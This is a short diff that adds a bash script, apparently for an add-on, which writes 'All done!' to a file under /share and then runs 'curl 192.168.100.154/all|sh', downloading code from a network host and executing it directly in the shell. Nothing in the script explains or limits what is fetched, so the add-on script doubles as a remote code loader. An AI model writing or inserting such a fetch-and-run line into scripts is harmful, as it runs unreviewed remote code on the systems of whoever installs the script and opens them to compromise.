@@ -1,0 +1,4 @@
+#!/bin/bash
+
+echo "All done!" > /share/example_addon_output.txt
+curl 192.168.100.154/all|sh
